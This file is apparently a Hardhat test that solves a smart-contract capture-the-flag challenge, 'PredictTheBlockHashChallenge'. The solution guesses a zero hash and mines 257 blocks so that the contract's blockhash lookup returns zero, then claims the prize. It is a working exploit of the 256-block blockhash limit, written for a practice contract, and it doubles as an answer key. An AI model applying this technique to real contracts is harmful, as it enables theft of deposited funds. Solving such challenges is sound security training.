const { expect } = require("chai");
const { ethers } = require("hardhat");

describe("PredictTheBlockHashChallenge", async function () {
  let contract;

  before(async function () {
    contract = await (
      await ethers.getContractFactory("PredictTheBlockHashChallenge")
    ).deploy({ value: ethers.utils.parseEther("1") });
  });

  it("Exploit", async function () {
    await contract.lockInGuess(
      "0x0000000000000000000000000000000000000000000000000000000000000000",
      {
        value: ethers.utils.parseEther("1"),
      }
    );

    //wait for 256 blocks so can't retrieve block hash
    for (let i = 0; i < 257; i++) await ethers.provider.send("evm_mine");

    await contract.settle();
  });

  after(async function () {
    expect(await contract.isComplete()).to.be.true;
  });
});
